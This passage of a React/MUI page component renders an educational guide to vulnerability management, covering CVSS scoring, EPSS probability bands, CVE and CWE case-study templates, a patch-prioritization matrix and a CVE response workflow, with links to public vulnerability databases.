                    <Typography variant="subtitle1" sx={{ fontWeight: "bold", mb: 2 }}>CVSS Metric Groups</Typography>
                    <Grid container spacing={1}>
                      <Grid item xs={12}>
                        <Box sx={{ p: 1.5, borderRadius: 1, bgcolor: alpha("#3b82f6", 0.1), mb: 1 }}>
                          <Typography variant="subtitle2" sx={{ fontWeight: "bold", color: "#3b82f6" }}>Base Score</Typography>
                          <Typography variant="body2" color="text.secondary">
                            Intrinsic characteristics: Attack Vector, Complexity, Privileges Required, User Interaction, Impact (C/I/A)
                          </Typography>
                        </Box>
                      </Grid>
                      <Grid item xs={12}>
                        <Box sx={{ p: 1.5, borderRadius: 1, bgcolor: alpha("#8b5cf6", 0.1), mb: 1 }}>
                          <Typography variant="subtitle2" sx={{ fontWeight: "bold", color: "#8b5cf6" }}>Temporal Score</Typography>
                          <Typography variant="body2" color="text.secondary">
                            Current state: Exploit Code Maturity, Remediation Level, Report Confidence
                          </Typography>
                        </Box>
                      </Grid>
                      <Grid item xs={12}>
                        <Box sx={{ p: 1.5, borderRadius: 1, bgcolor: alpha("#10b981", 0.1) }}>
                          <Typography variant="subtitle2" sx={{ fontWeight: "bold", color: "#10b981" }}>Environmental Score</Typography>
                          <Typography variant="body2" color="text.secondary">
                            Organization-specific: Modified Base Metrics, Confidentiality/Integrity/Availability Requirements
                          </Typography>
                        </Box>
                      </Grid>
                    </Grid>
                  </Paper>
                  <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), mt: 2 }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: "bold", mb: 1 }}>Example CVSS Vector</Typography>
                    <Box sx={{ fontFamily: "monospace", fontSize: "0.9rem", bgcolor: alpha("#f59e0b", 0.1), p: 2, borderRadius: 1, mb: 1, overflowX: "auto" }}>
                      CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
                    </Box>
                    <Typography variant="body2" color="text.secondary">
                      <strong>Translation:</strong> Network-accessible (AV:N), Low complexity (AC:L), No privileges required (PR:N), No user interaction (UI:N), Unchanged scope (S:U), High impact to Confidentiality (C:H), Integrity (I:H), and Availability (A:H). <strong>Score: 9.8 Critical</strong>
                    </Typography>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Paper sx={{ p: 2, bgcolor: alpha(severity.color, 0.05), border: `2px solid ${severity.color}` }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: "bold", mb: 2 }}>Interactive CVSS Calculator</Typography>
                    <Box sx={{ textAlign: "center", mb: 2 }}>
                      <Typography variant="h2" sx={{ fontWeight: 800, color: severity.color }}>
                        {cvssScore.toFixed(1)}
                      </Typography>
                      <Chip label={severity.label} sx={{ bgcolor: severity.color, color: "white", fontWeight: 700, mt: 1 }} />
                    </Box>
                    <Slider
                      value={cvssScore}
                      onChange={(_, v) => setCvssScore(v as number)}
                      min={0}
                      max={10}
                      step={0.1}
                      marks={[
                        { value: 0, label: "0" },
                        { value: 4, label: "4" },
                        { value: 7, label: "7" },
                        { value: 9, label: "9" },
                        { value: 10, label: "10" },
                      ]}
                      sx={{ color: severity.color }}
                    />
                    <Divider sx={{ my: 2 }} />
                    <Typography variant="subtitle2" sx={{ fontWeight: "bold", mb: 1 }}>Severity Ranges</Typography>
                    {[
                      { range: "0.0", label: "None", color: "#6b7280" },
                      { range: "0.1-3.9", label: "Low", color: "#22c55e" },
                      { range: "4.0-6.9", label: "Medium", color: "#f59e0b" },
                      { range: "7.0-8.9", label: "High", color: "#ef4444" },
                      { range: "9.0-10.0", label: "Critical", color: "#dc2626" },
                    ].map((s) => (
                      <Box key={s.label} sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                        <Box sx={{ width: 12, height: 12, borderRadius: "50%", bgcolor: s.color }} />
                        <Typography variant="body2" sx={{ flex: 1 }}>{s.label}</Typography>
                        <Typography variant="caption" color="text.secondary">{s.range}</Typography>
                      </Box>
                    ))}
                  </Paper>
                </Grid>
              </Grid>
            </Paper>
          </Box>

          {/* EPSS Section */}
          <Box id="epss" sx={{ mb: 4 }}>
            <Typography variant="h5" gutterBottom sx={{ fontWeight: "bold", display: "flex", alignItems: "center", gap: 1 }}>
              <TrendingUpIcon color="primary" />
              EPSS: Exploit Prediction Scoring System
            </Typography>
            <Paper sx={{ p: 3, mb: 2 }}>
              <Typography variant="body1" paragraph>
                <strong>EPSS</strong> uses machine learning to estimate the probability (0-100%) that a vulnerability will be exploited in the wild within the next 30 days. Unlike CVSS (severity), EPSS measures likelihood of exploitation. A vulnerability might have high CVSS but low EPSS, meaning it's severe IF exploited but unlikely to be exploited.
              </Typography>
              <Alert severity="success" sx={{ mb: 2 }}>
                <AlertTitle>CVSS vs EPSS</AlertTitle>
                <strong>CVSS:</strong> How bad is it IF exploited? (Severity)<br />
                <strong>EPSS:</strong> How likely IS it to be exploited? (Probability)<br />
                <strong>Best Practice:</strong> Use BOTH - prioritize High CVSS + High EPSS first
              </Alert>
              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#10b981", 0.05) }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: "bold", mb: 1 }}>How EPSS Works</Typography>
                    <List dense>
                      <ListItem>
                        <ListItemIcon><TrendingUpIcon sx={{ color: "#10b981", fontSize: 20 }} /></ListItemIcon>
                        <ListItemText primary="Machine learning on historical exploitation data" />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><TrendingUpIcon sx={{ color: "#10b981", fontSize: 20 }} /></ListItemIcon>
                        <ListItemText primary="Scores range from 0% to 100% probability" />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><TrendingUpIcon sx={{ color: "#10b981", fontSize: 20 }} /></ListItemIcon>
                        <ListItemText primary="Updated daily with new threat intelligence" />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><TrendingUpIcon sx={{ color: "#10b981", fontSize: 20 }} /></ListItemIcon>
                        <ListItemText primary="Factors: CVE age, CVSS, vendor, exploit availability" />
                      </ListItem>
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05) }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: "bold", mb: 1 }}>EPSS Percentile Bands</Typography>
                    <List dense>
                      <ListItem>
                        <ListItemText
                          primary={<Typography variant="body2" sx={{ fontWeight: "bold", color: "#dc2626" }}>Top 1%</Typography>}
                          secondary="Emergency patching - treat as critical incident"
                        />
                      </ListItem>
                      <ListItem>
                        <ListItemText
                          primary={<Typography variant="body2" sx={{ fontWeight: "bold", color: "#ef4444" }}>Top 5%</Typography>}
                          secondary="Accelerate patching - confirm exposure immediately"
                        />
                      </ListItem>
                      <ListItem>
                        <ListItemText
                          primary={<Typography variant="body2" sx={{ fontWeight: "bold", color: "#f59e0b" }}>Top 10%</Typography>}
                          secondary="Prioritize in near-term patch window (7-14 days)"
                        />
                      </ListItem>
                      <ListItem>
                        <ListItemText
                          primary={<Typography variant="body2" sx={{ fontWeight: "bold", color: "#22c55e" }}>Below Median</Typography>}
                          secondary="Standard patch cycle with monitoring for EPSS changes"
                        />
                      </ListItem>
                    </List>
                  </Paper>
                </Grid>
              </Grid>
            </Paper>
          </Box>

          {/* Famous CVEs Section */}
          <Box id="famous-cves" sx={{ mb: 4 }}>
            <Typography variant="h5" gutterBottom sx={{ fontWeight: "bold", display: "flex", alignItems: "center", gap: 1 }}>
              <LocalFireDepartmentIcon sx={{ color: "#ef4444" }} />
              Famous CVEs: Case Studies
            </Typography>
            {famousCVEs.map((cve, idx) => (
              <Accordion key={cve.id} defaultExpanded={idx === 0}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 2, flexWrap: "wrap", width: "100%" }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: "bold", color: "#3b82f6" }}>
                      {cve.id}
                    </Typography>
                    <Chip label={cve.name} size="small" sx={{ bgcolor: alpha("#ef4444", 0.1), color: "#ef4444", fontWeight: "bold" }} />
                    <Chip label={`CVSS ${cve.cvss}`} size="small" sx={{ bgcolor: getCVSSSeverity(cve.cvss).color, color: "white", fontWeight: "bold" }} />
                    <Chip label={`EPSS ${(cve.epss * 100).toFixed(1)}%`} size="small" sx={{ bgcolor: alpha("#10b981", 0.1), color: "#10b981", fontWeight: "bold" }} />
                  </Box>
                </AccordionSummary>
                <AccordionDetails>
                  <Grid container spacing={2}>
                    <Grid item xs={12}>
                      <Typography variant="body2" sx={{ fontWeight: "bold", mb: 0.5 }}>Description:</Typography>
                      <Typography variant="body2" color="text.secondary" paragraph>{cve.description}</Typography>
                    </Grid>
                    {cve.detailedDescription && (
                      <Grid item xs={12}>
                        <Alert severity="info" sx={{ bgcolor: alpha("#3b82f6", 0.05) }}>
                          <AlertTitle sx={{ fontWeight: "bold", display: "flex", alignItems: "center", gap: 1 }}>
                            <MenuBookIcon fontSize="small" />
                            Deep Dive: Understanding {cve.name}
                          </AlertTitle>
                          <Typography variant="body2" sx={{ whiteSpace: "pre-line" }}>{cve.detailedDescription}</Typography>
                        </Alert>
                      </Grid>
                    )}
                    <Grid item xs={12}>
                      <Typography variant="body2" sx={{ fontWeight: "bold", mb: 0.5 }}>Real-World Impact:</Typography>
                      <Typography variant="body2" color="text.secondary" paragraph>{cve.impact}</Typography>
                    </Grid>
                    <Grid item xs={12}>
                      <Typography variant="body2" sx={{ fontWeight: "bold", mb: 0.5 }}>Exploitability:</Typography>
                      <Typography variant="body2" color="text.secondary" paragraph>{cve.exploitability}</Typography>
                    </Grid>
                    {cve.beginnerTips && cve.beginnerTips.length > 0 && (
                      <Grid item xs={12}>
                        <Alert severity="success" sx={{ bgcolor: alpha("#10b981", 0.05) }}>
                          <AlertTitle sx={{ fontWeight: "bold", display: "flex", alignItems: "center", gap: 1 }}>
                            <TipsAndUpdatesIcon fontSize="small" />
                            Beginner Tips & Key Insights
                          </AlertTitle>
                          <List dense>
                            {cve.beginnerTips.map((tip, i) => (
                              <ListItem key={i} sx={{ py: 0.5, alignItems: "flex-start" }}>
                                <ListItemIcon sx={{ minWidth: 28, mt: 0.5 }}>
                                  <CheckCircleIcon sx={{ fontSize: 18, color: "#10b981" }} />
                                </ListItemIcon>
                                <ListItemText 
                                  primary={<Typography variant="body2" sx={{ whiteSpace: "pre-line" }}>{tip}</Typography>} 
                                />
                              </ListItem>
                            ))}
                          </List>
                        </Alert>
                      </Grid>
                    )}
                    <Grid item xs={12}>
                      <Alert severity="info">
                        <Typography variant="body2" sx={{ fontWeight: "bold", mb: 0.5 }}>Mitigation:</Typography>
                        <Typography variant="body2">{cve.mitigation}</Typography>
                      </Alert>
                    </Grid>
                    <Grid item xs={12}>
                      <Button
                        component="a"
                        href={`https://nvd.nist.gov/vuln/detail/${cve.id}`}
                        target="_blank"
                        variant="outlined"
                        size="small"
                        startIcon={<LaunchIcon />}
                        sx={{ borderColor: "#3b82f6", color: "#3b82f6" }}
                      >
                        View on NVD
                      </Button>
                    </Grid>
                  </Grid>
                </AccordionDetails>
              </Accordion>
            ))}
          </Box>

          {/* Top 25 CWEs Section */}
          <Box id="top-cwes" sx={{ mb: 4 }}>
            <Typography variant="h5" gutterBottom sx={{ fontWeight: "bold", display: "flex", alignItems: "center", gap: 1 }}>
              <BugReportIcon color="primary" />
              Top 12 Most Dangerous CWEs
            </Typography>
            <Paper sx={{ p: 2, mb: 2 }}>
              {topCWEs.slice(0, 12).map((cwe, idx) => (
                <Accordion key={cwe.id}>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 2, flexWrap: "wrap", width: "100%" }}>
                      <Chip label={`#${cwe.rank}`} size="small" sx={{ bgcolor: alpha(ACCENT_COLOR, 0.1), color: ACCENT_COLOR, fontWeight: "bold", minWidth: 45 }} />
                      <Typography variant="subtitle2" sx={{ fontWeight: "bold", color: "#8b5cf6" }}>
                        {cwe.id}
                      </Typography>
                      <Typography variant="body2" sx={{ fontWeight: "bold" }}>
                        {cwe.name}
                      </Typography>
                      <Chip label={cwe.category} size="small" variant="outlined" />
                    </Box>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Grid container spacing={2}>
                      <Grid item xs={12}>
                        <Typography variant="body2" sx={{ fontWeight: "bold", mb: 0.5 }}>Description:</Typography>
                        <Typography variant="body2" color="text.secondary" paragraph>{cwe.description}</Typography>
                      </Grid>
                      <Grid item xs={12}>
                        <Typography variant="body2" sx={{ fontWeight: "bold", mb: 0.5 }}>Real-World Example:</Typography>
                        <Typography variant="body2" color="text.secondary" paragraph>{cwe.realWorldExample}</Typography>
                      </Grid>
                      {cwe.beginnerTips && cwe.beginnerTips.length > 0 && (
                        <Grid item xs={12}>
                          <Alert severity="warning" sx={{ bgcolor: alpha("#f59e0b", 0.05) }}>
                            <AlertTitle sx={{ fontWeight: "bold", display: "flex", alignItems: "center", gap: 1 }}>
                              <TipsAndUpdatesIcon fontSize="small" />
                              Beginner Tips & Key Insights
                            </AlertTitle>
                            <List dense>
                              {cwe.beginnerTips.map((tip, i) => (
                                <ListItem key={i} sx={{ py: 0.5, alignItems: "flex-start" }}>
                                  <ListItemIcon sx={{ minWidth: 28, mt: 0.5 }}>
                                    <CheckCircleIcon sx={{ fontSize: 18, color: "#f59e0b" }} />
                                  </ListItemIcon>
                                  <ListItemText 
                                    primary={<Typography variant="body2" sx={{ whiteSpace: "pre-line" }}>{tip}</Typography>} 
                                  />
                                </ListItem>
                              ))}
                            </List>
                          </Alert>
                        </Grid>
                      )}
                      <Grid item xs={12}>
                        <Alert severity="success">
                          <Typography variant="body2" sx={{ fontWeight: "bold", mb: 1 }}>Prevention Techniques:</Typography>
                          <List dense>
                            {cwe.preventionTechniques.map((tech, i) => (
                              <ListItem key={i} sx={{ py: 0 }}>
                                <ListItemIcon sx={{ minWidth: 24 }}>
                                  <CheckCircleIcon sx={{ fontSize: 16, color: "#10b981" }} />
                                </ListItemIcon>
                                <ListItemText primary={<Typography variant="body2">{tech}</Typography>} />
                              </ListItem>
                            ))}
                          </List>
                        </Alert>
                      </Grid>
                      <Grid item xs={12}>
                        <Button
                          component="a"
                          href={`https://cwe.mitre.org/data/definitions/${cwe.id.split("-")[1]}.html`}
                          target="_blank"
                          variant="outlined"
                          size="small"
                          startIcon={<LaunchIcon />}
                          sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
                        >
                          View on CWE Database
                        </Button>
                      </Grid>
                    </Grid>
                  </AccordionDetails>
                </Accordion>
              ))}
            </Paper>
          </Box>

          {/* Prioritization Matrix Section */}
          <Box id="prioritization" sx={{ mb: 4 }}>
            <Typography variant="h5" gutterBottom sx={{ fontWeight: "bold", display: "flex", alignItems: "center", gap: 1 }}>
              <PriorityHighIcon color="primary" />
              Vulnerability Prioritization Matrix
            </Typography>
            <Paper sx={{ p: 3 }}>
              <Typography variant="body1" paragraph>
                Effective vulnerability prioritization combines CVSS (severity), EPSS (likelihood), KEV (confirmed exploitation), asset criticality, and compensating controls. Use this matrix as a starting point and adjust based on your organization's risk tolerance.
              </Typography>
              <TableContainer>
                <Table>
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ fontWeight: "bold" }}>Scenario</TableCell>
                      <TableCell sx={{ fontWeight: "bold" }}>Priority</TableCell>
                      <TableCell sx={{ fontWeight: "bold" }}>Action</TableCell>
                      <TableCell sx={{ fontWeight: "bold" }}>Timeline</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    <TableRow>
                      <TableCell>KEV Listed</TableCell>
                      <TableCell><Chip label="P0 - Critical" size="small" sx={{ bgcolor: "#dc2626", color: "white", fontWeight: "bold" }} /></TableCell>
                      <TableCell>Emergency patching or isolation immediately</TableCell>
                      <TableCell>24 hours</TableCell>
                    </TableRow>
                    <TableRow>
                      <TableCell>High CVSS (9.0+) + High EPSS (90%+)</TableCell>
                      <TableCell><Chip label="P0 - Critical" size="small" sx={{ bgcolor: "#ef4444", color: "white", fontWeight: "bold" }} /></TableCell>
                      <TableCell>Emergency patch or mitigate, confirm exposure</TableCell>
                      <TableCell>48-72 hours</TableCell>
                    </TableRow>
                    <TableRow>
                      <TableCell>High CVSS (7.0-8.9) + High EPSS (50%+)</TableCell>
                      <TableCell><Chip label="P1 - High" size="small" sx={{ bgcolor: "#f59e0b", color: "white", fontWeight: "bold" }} /></TableCell>
                      <TableCell>Accelerate patching, implement temp controls</TableCell>
                      <TableCell>7 days</TableCell>
                    </TableRow>
                    <TableRow>
                      <TableCell>High CVSS (9.0+) + Low EPSS (&lt;10%)</TableCell>
                      <TableCell><Chip label="P2 - Medium" size="small" sx={{ bgcolor: "#3b82f6", color: "white", fontWeight: "bold" }} /></TableCell>
                      <TableCell>Patch in next cycle, monitor EPSS/KEV</TableCell>
                      <TableCell>30 days</TableCell>
                    </TableRow>
                    <TableRow>
                      <TableCell>Medium CVSS (4.0-6.9) + High EPSS (50%+)</TableCell>
                      <TableCell><Chip label="P2 - Medium" size="small" sx={{ bgcolor: "#3b82f6", color: "white", fontWeight: "bold" }} /></TableCell>
                      <TableCell>Validate exploitability and exposure</TableCell>
                      <TableCell>30 days</TableCell>
                    </TableRow>
                    <TableRow>
                      <TableCell>Low CVSS (&lt;4.0) + Low EPSS (&lt;10%)</TableCell>
                      <TableCell><Chip label="P3 - Low" size="small" sx={{ bgcolor: "#22c55e", color: "white", fontWeight: "bold" }} /></TableCell>
                      <TableCell>Backlog or accept risk with monitoring</TableCell>
                      <TableCell>90 days or next major release</TableCell>
                    </TableRow>
                  </TableBody>
                </Table>
              </TableContainer>
              <Alert severity="warning" sx={{ mt: 2 }}>
                <Typography variant="body2" sx={{ fontWeight: "bold", mb: 0.5 }}>Important Considerations:</Typography>
                <List dense>
                  <ListItem>
                    <ListItemIcon><WarningIcon sx={{ fontSize: 18, color: "#f59e0b" }} /></ListItemIcon>
                    <ListItemText primary="Adjust priorities UP for internet-facing assets, crown-jewel systems, or compliance requirements" />
                  </ListItem>
                  <ListItem>
                    <ListItemIcon><WarningIcon sx={{ fontSize: 18, color: "#f59e0b" }} /></ListItemIcon>
                    <ListItemText primary="Adjust priorities DOWN if compensating controls exist (WAF, network segmentation, disabled features)" />
                  </ListItem>
                  <ListItem>
                    <ListItemIcon><WarningIcon sx={{ fontSize: 18, color: "#f59e0b" }} /></ListItemIcon>
                    <ListItemText primary="Monitor EPSS scores daily - sudden increases indicate emerging threat actor interest" />
                  </ListItem>
                </List>
              </Alert>
            </Paper>
          </Box>

          {/* Response Workflow Section */}
          <Box id="workflow" sx={{ mb: 4 }}>
            <Typography variant="h5" gutterBottom sx={{ fontWeight: "bold", display: "flex", alignItems: "center", gap: 1 }}>
              <TimelineIcon color="primary" />
              CVE Response Workflow
            </Typography>
            <Paper sx={{ p: 3 }}>
              <Typography variant="body1" paragraph>
                A systematic CVE response workflow ensures no steps are missed during vulnerability remediation. This process applies to all severity levels, with timeline adjustments based on priority.
              </Typography>
              <Grid container spacing={2}>
                {[
                  {
                    step: 1,
                    title: "Assess & Scope",
                    tasks: [
                      "Confirm affected versions from CVE description and CPE names",
                      "Query asset inventory and dependency scanners for vulnerable components",
                      "Determine exposure: Internet-facing? Authenticated? Reachable?",
                      "Check CVSS score, EPSS percentile, and KEV listing"
                    ],
                    icon: <AssessmentIcon />
                  },
                  {
                    step: 2,
                    title: "Prioritize & Plan",
                    tasks: [
                      "Apply prioritization matrix (KEV > High CVSS+EPSS > High CVSS)",
                      "Factor in asset criticality and business impact",
                      "Identify compensating controls if patching delayed",
                      "Assign owner, set deadline, and escalate if needed"
                    ],
                    icon: <PriorityHighIcon />
                  },
                  {
                    step: 3,
                    title: "Research & Remediate",
                    tasks: [
                      "Check vendor advisory for official patch/workaround",
                      "Review patch release notes for breaking changes",
                      "Test patch in dev/staging environment first",
                      "Implement temporary mitigations if patch unavailable (WAF rules, network isolation, feature disable)"
                    ],
                    icon: <BuildIcon />
                  },
                  {
                    step: 4,
                    title: "Deploy & Verify",
                    tasks: [
                      "Deploy patch following change management procedures",
                      "Verify remediation with vulnerability scanner rescan",
                      "Confirm application functionality post-patch",
                      "Update asset inventory with new version numbers"
                    ],
                    icon: <CheckCircleIcon />
                  },
                  {
                    step: 5,
                    title: "Monitor & Document",
                    tasks: [
                      "Monitor for exploitation attempts in logs/IDS/WAF",
                      "Track EPSS score changes indicating increased threat",
                      "Document lessons learned and update runbooks",
                      "Close ticket with verification evidence (scan results, version checks)"
                    ],
                    icon: <ShieldIcon />
                  },
                ].map((phase) => (
                  <Grid item xs={12} md={6} lg={4} key={phase.step}>
                    <Card sx={{ height: "100%", border: `2px solid ${alpha(ACCENT_COLOR, 0.3)}` }}>
                      <CardContent>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
                          <Box sx={{
                            bgcolor: ACCENT_COLOR,
                            color: "white",
                            borderRadius: "50%",
                            width: 32,
                            height: 32,
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            fontWeight: "bold"
                          }}>
                            {phase.step}
                          </Box>
                          <Box sx={{ color: ACCENT_COLOR }}>
                            {phase.icon}
                          </Box>
                          <Typography variant="subtitle1" sx={{ fontWeight: "bold" }}>
                            {phase.title}
                          </Typography>
                        </Box>
                        <List dense>
                          {phase.tasks.map((task, i) => (
                            <ListItem key={i} sx={{ py: 0.5, px: 0 }}>
                              <ListItemIcon sx={{ minWidth: 24 }}>
                                <CheckCircleIcon sx={{ fontSize: 16, color: "#10b981" }} />
                              </ListItemIcon>
                              <ListItemText primary={<Typography variant="body2">{task}</Typography>} />
                            </ListItem>
                          ))}
                        </List>
                      </CardContent>
                    </Card>
                  </Grid>
                ))}
              </Grid>
            </Paper>
          </Box>

          {/* Quick Reference Section */}
          <Paper sx={{ p: 3, mb: 4, bgcolor: alpha("#3b82f6", 0.05) }}>
            <Typography variant="h6" gutterBottom sx={{ fontWeight: "bold" }}>
              Quick Reference: External Resources
            </Typography>
            <Grid container spacing={2}>
              {[
                { title: "CVE List", url: "https://cve.mitre.org/", desc: "Official CVE database from MITRE" },
                { title: "NVD", url: "https://nvd.nist.gov/", desc: "National Vulnerability Database with CVSS scores" },
                { title: "CWE Top 25", url: "https://cwe.mitre.org/top25/", desc: "Most dangerous software weaknesses" },
                { title: "FIRST CVSS", url: "https://www.first.org/cvss/", desc: "CVSS calculator and specification" },
                { title: "FIRST EPSS", url: "https://www.first.org/epss/", desc: "EPSS calculator and API" },
                { title: "CISA KEV", url: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog", desc: "Known Exploited Vulnerabilities catalog" },
                { title: "CAPEC", url: "https://capec.mitre.org/", desc: "Common Attack Pattern Enumeration" },
                { title: "CPE Dictionary", url: "https://nvd.nist.gov/products/cpe", desc: "Product naming for vulnerability tracking" },
              ].map((resource) => (
                <Grid item xs={12} sm={6} md={3} key={resource.title}>
                  <Card sx={{ height: "100%", "&:hover": { boxShadow: 4 } }}>
                    <CardContent>
                      <Typography variant="subtitle2" sx={{ fontWeight: "bold", mb: 1 }}>
                        {resource.title}
                      </Typography>
                      <Typography variant="body2" color="text.secondary" sx={{ mb: 1.5, minHeight: 40 }}>
                        {resource.desc}
                      </Typography>
                      <Button
                        component="a"
                        href={resource.url}
                        target="_blank"
                        size="small"
                        variant="outlined"
                        endIcon={<LaunchIcon />}
                        fullWidth
                      >
                        Visit
                      </Button>
                    </CardContent>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* Quiz Section */}
          <Box id="quiz">
            <QuizSection questions={quizQuestions} />
          </Box>

          {/* Bottom Navigation */}
          <Box sx={{ mt: 4, textAlign: "center" }}>
            <Button
              variant="outlined"
              startIcon={<ArrowBackIcon />}
              onClick={() => navigate("/learn")}
              sx={{ borderColor: ACCENT_COLOR, color: ACCENT_COLOR }}
            >
              Back to Learning Hub
            </Button>
          </Box>
        </Box>
      </Box>
    </LearnPageLayout>
  );
}
